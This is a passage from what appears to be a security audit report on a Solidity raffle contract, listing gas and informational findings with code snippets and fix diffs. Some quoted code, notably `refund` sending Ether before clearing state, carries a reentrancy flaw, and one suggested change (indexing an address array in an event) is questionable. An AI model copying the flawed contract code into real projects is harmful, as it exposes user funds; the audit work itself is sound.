1. Instead of returning 0 when there is a non-existing player it should revert, return -1 (int256) or return `true, i` / `false, 0` (bool, uint256).
2. Start indexing players at 1st position, reserving the 0th position only for the non-existing user.

*Note: Second mitigation requires auditing every loop and length check in the contract, since `players.length` would no longer match the number of participants.*



## Gas

### [G-1] Unchanged state variables should be declared as `constant` or `immutable`

**Description:** Reading from storage is expensive. State variables that are never modified after deployment should be declared as immutable or constant to save gas.  

Instances:
- `PuppyRaffle::raffleDuration` should be `immutable`.
- `PuppyRaffle::commonImageUri` should be `constant`.
- `PuppyRaffle::rareImageUri` should be `constant`.
- `PuppyRaffle::legendaryImageUri` should be `constant`.

**Recommendation:** Change there declaration as it was suggested before.  

### [G-2] Storage variables in a loop should be cached

**Description:** Every time you call `players.length` you read from storage. This is very expensive in a loop because in each loop cost more gas than caching it in memory.   

```solidity
    // @audit-gas uint256 playersLength = players.length;
@>  for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
```  

**Recommendation:** Create a new variable to store `players.length` so it is only read once instead of on every iteration.  

```diff
+   uint256 playersLength = players.length;
-   for (uint256 i = 0; i < players.length - 1; i++) {
+   for (uint256 i = 0; i < playersLength - 1; i++) {
-       for (uint256 j = i + 1; j < players.length; j++) {
+       for (uint256 j = i + 1; j < playersLength; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
```  


### [G-3] State is written to storage before the duplicate check in `PuppyRaffle::enterRaffle`, wasting gas on reverted transactions

**Description:** `PuppyRaffle::enterRaffle` pushes every address in `newPlayers` into the `players` storage array before verifying that no duplicates exist. If a duplicate is found, the transaction reverts and all state changes are rolled back, but the gas spent on those writes is not refunded to the caller. Each `players.push()` on a fresh storage slot costs gas, so a call carrying a duplicate near the end of a large array pays for every preceding write before the check ever runs.  

```solidity
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");

@>      for (uint256 i = 0; i < newPlayers.length; i++) {
@>          players.push(newPlayers[i]);
        }

        // Check for duplicates
        for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
        emit RaffleEnter(newPlayers);
    }
```  

**Impact:** Callers submitting an array containing a duplicate pay for storage writes that are discarded. With 50 new players and a duplicate in the last position, unnecessary gas is consumed before the revert. The contract itself is not harmed, but the cost falls entirely on the user.  

**Recommended Mitigation:** Validate before writing, so that a rejected call reverts before any storage is touched.  

```diff
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");

-       for (uint256 i = 0; i < newPlayers.length; i++) {
-           players.push(newPlayers[i]);
-       }
-
-       // Check for duplicates
-       for (uint256 i = 0; i < players.length - 1; i++) {
-           for (uint256 j = i + 1; j < players.length; j++) {
-               require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-           }
-       }
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+           for (uint256 j = 0; j < players.length; j++) {
+               require(players[j] != newPlayers[i], "PuppyRaffle: Duplicate player");
+           }
+           for (uint256 k = i + 1; k < newPlayers.length; k++) {
+               require(newPlayers[i] != newPlayers[k], "PuppyRaffle: Duplicate player");
+           }
+       }
+
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+           players.push(newPlayers[i]);
+       }
        emit RaffleEnter(newPlayers);
    }
```  

*Note: the rewritten check covers both cases the original relied on: duplicates between the new entries and the existing players, and duplicates within `newPlayers` itself.*  



## Informational

### [I-1] Solidity pragma should be specific, not wide

**Description:** Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.20`, use `pragma solidity 0.8.20`.  

```solidity
@>  pragma solidity ^0.7.6;
```  
**Recommendation:** Deploy with a specific, recent version of Solidity with no known severe issues, for example `pragma solidity 0.8.20`.


### [I-2] Using an outdated Solidity version is not recommended

**Description:** `solc` frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks.  

```solidity
@>  pragma solidity ^0.7.6;
```  

**Recommendation:** Deploy with a recent version of Solidity (at least 0.8.0) with no known severe issues. Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.  

See [Slither](https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity) documentation for more information.  


### [I-3] Missing checks for `address(0)` when assigning values to address state variables

**Description:** Check for `address(0)` when assigning values to address state variables. If the assigned address to receive the fees is `address(0)` all the fees sent to that address through `PuppyRaffle::withdrawFees` are burned permanently. 

```solidity
    constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) ERC721("Puppy Raffle", "PR") {
        entranceFee = _entranceFee;
@>      feeAddress = _feeAddress;

    ...
    }

    ...

    function changeFeeAddress(address newFeeAddress) external onlyOwner {
@>      feeAddress = newFeeAddress;
        emit FeeAddressChanged(newFeeAddress);
    }
```  

**Recommendation:** Check for `address(0)` through a require or if loop:  

```diff
constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) ERC721("Puppy Raffle", "PR") {
+   require(_feeAddress != address(0));
    entranceFee = _entranceFee;
    feeAddress = _feeAddress;

    ...
}

...

function changeFeeAddress(address newFeeAddress) external onlyOwner {
+   require(newFeeAddress != address(0));
    feeAddress = newFeeAddress;
    emit FeeAddressChanged(newFeeAddress);
}
```  

or

```diff
constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) ERC721("Puppy Raffle", "PR") {
+   if (_feeAddress == address(0)) revert PuppyRaffle__ZeroFeeAddress();
    entranceFee = _entranceFee;
    feeAddress = _feeAddress;

    ...
}

...

function changeFeeAddress(address newFeeAddress) external onlyOwner {
+   if (newFeeAddress == address(0)) revert PuppyRaffle__ZeroFeeAddress();
    feeAddress = newFeeAddress;
    emit FeeAddressChanged(newFeeAddress);
}
```  


### [I-4] Some events are missing `indexed` fields

**Description:** Indexed event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields).  

```solidity
@>  event RaffleEnter(address[] newPlayers);
@>  event RaffleRefunded(address player);
@>  event FeeAddressChanged(address newFeeAddress);
```

**Recommendation:** Add the indexed keyword to address parameters in events to enable efficient off-chain filtering.  

```diff
-   event RaffleEnter(address[] newPlayers);
+   event RaffleEnter(address[] indexed newPlayers);
-   event RaffleRefunded(address player);
+   event RaffleRefunded(address indexed player);
-   event FeeAddressChanged(address newFeeAddress);
+   event FeeAddressChanged(address indexed newFeeAddress); 
```  

See [Slither](https://github.com/crytic/slither/wiki/Detector-Documentation#unindexed-event-address-parameters) documentation for more information.  


### [I-5] Use of "magic" numbers in `PuppyRaffle::selectWinner` is discouraged

**Description:** `PuppyRaffle::selectWinner` hsas this two lines of code (code below) where magic numbers or number literals (`80`, `100` and `20`) are used making the codebase more confusing and harder to understand where those numbers came from.  

```solidity
    function selectWinner() external {
        ...

        // @audit-info Magic numbers
@>      uint256 prizePool = (totalAmountCollected * 80) / 100;
@>      uint256 fee = (totalAmountCollected * 20) / 100;

        ...
    }
```

**Recommendation:** Instead, use constant variables with some descriptive name to have a better understanding of the code and make it more clearer.  

```diff
    uint256 public immutable entranceFee;

+   uint256 public constant PRIZE_POOL_PERCENTAGE = 80;
+   uint256 public constant FEE_PERCENTAGE = 20;
+   uint256 public constant POOL_PRECISION = 100;

        function selectWinner() external {
            ...

-           uint256 prizePool = (totalAmountCollected * 80) / 100;
-           uint256 fee = (totalAmountCollected * 20) / 100;
+           uint256 prizePool = (totalAmountCollected * PRIZE_POOL_PERCENTAGE) / POOL_PRECISION;
+           uint256 fee = (totalAmountCollected * FEE_PERCENTAGE) / POOL_PRECISION;

            ...
        }
```  

### [I-6] `PuppyRaffle::_isActivePlayer` function is never used

**Description:** `PuppyRaffle::_isActivePlayer` function is marked as an `internal` function but actually is never used. This dead-code makes the contract harder to read and adds noise.   

```solidity
@>  function _isActivePlayer() internal view returns (bool) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == msg.sender) {
                return true;
            }
        }
        return false;
    }
```  

**Recommendation:** Remove the function.  

```diff
-   function _isActivePlayer() internal view returns (bool) {
-       for (uint256 i = 0; i < players.length; i++) {
-           if (players[i] == msg.sender) {
-               return true;
-           }
-       }
-       return false;
-   }
```  


### [I-7] `PuppyRaffle::refund` emits `RaffleRefunded` after the external call, allowing events to be emitted out of order

**Description:** `RaffleRefunded` is emitted after `sendValue`, which hands control to the recipient. If that recipient re-enters `refund`, the nested calls complete first, so their events are emitted before the event of the outer call. Any off-chain consumer that reconstructs state from event ordering sees a sequence that does not match what happened on-chain.  

```solidity
    function refund(uint256 playerIndex) public {
        ...

        payable(msg.sender).sendValue(entranceFee);

        players[playerIndex] = address(0);
        // @audit-low Reentrancy event
@>      emit RaffleRefunded(playerAddress);
```  

**Recommended Mitigation:** Emit the event before the external call, so that ordering reflects execution order regardless of what the recipient does.  

```diff
+       emit RaffleRefunded(playerAddress);

        payable(msg.sender).sendValue(entranceFee);

-       emit RaffleRefunded(playerAddress);
```  


### [I-8] `PuppyRaffle::refund` requires the caller to supply their own array index, which is error-prone and unnecessary

**Description:** `PuppyRaffle::refund` takes a `playerIndex` parameter and then checks that the address stored at that position matches `msg.sender`. The index is information the contract already holds, forcing the caller to compute it off-chain and pass it back adds a step that can only go wrong. A caller who supplies the wrong index gets a revert whose message ("Only the player can refund") does not describe what actually happened, since the real problem is a mistaken index rather than an unauthorised caller.  

```solidity
    // @audit-info the index is derivable from msg.sender
@>  function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        payable(msg.sender).sendValue(entranceFee);

        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
```  

**Impact:** Legitimate users can be unable to claim a refund they are entitled to, simply because they passed the wrong index. The revert message points them at a permission problem that does not exist, making the failure hard to diagnose.  

**Recommended Mitigation:** Track each player's position in a mapping and derive it from `msg.sender`, removing the parameter entirely.  

```diff
+   mapping(address => uint256) private playerIndexPlusOne;

    ...

    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");

        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+           playerIndexPlusOne[newPlayers[i]] = players.length;
        }

        ...
    }

    ...

-   function refund(uint256 playerIndex) public {
+   function refund() public {
+       uint256 storedIndex = playerIndexPlusOne[msg.sender];
+       require(storedIndex != 0, "PuppyRaffle: Player already refunded, or is not active");
+       uint256 playerIndex = storedIndex - 1;
+
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
-       require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        payable(msg.sender).sendValue(entranceFee);

        players[playerIndex] = address(0);
+       playerIndexPlusOne[msg.sender] = 0;
        emit RaffleRefunded(playerAddress);
    }
```  

*Note: the mapping stores the index offset by one so that a value of 0 unambiguously means the address is not an active player. It must also be cleared when the raffle resets, otherwise a returning player would keep a stale index from a previous round.*  